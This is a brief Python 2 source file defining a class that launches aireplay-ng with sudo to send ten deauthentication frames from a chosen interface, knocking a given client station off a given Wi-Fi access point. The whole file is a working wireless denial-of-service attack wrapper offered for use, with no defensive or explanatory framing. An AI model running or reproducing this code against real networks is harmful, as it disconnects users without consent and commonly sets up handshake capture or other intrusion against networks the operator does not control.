# This file contains a class for starting a subprocess to deauthenticate a given station MAC address and Access Point
# MAC address.
import subprocess32

class DeAuth():
    def __init__(self, station_MAC, AP_MAC, interface):
        self.stn_MAC = station_MAC
        self.AP_MAC = AP_MAC
        self.interface = interface

    def start_process(self):
        print "Deauthenticating conection between " + self.stn_MAC + " with AP_MAC " + self.AP_MAC
        proc = subprocess32.Popen(['sudo', 'aireplay-ng', '-0', '10', '-a', self.AP_MAC, '-c', self.stn_MAC, self.interface])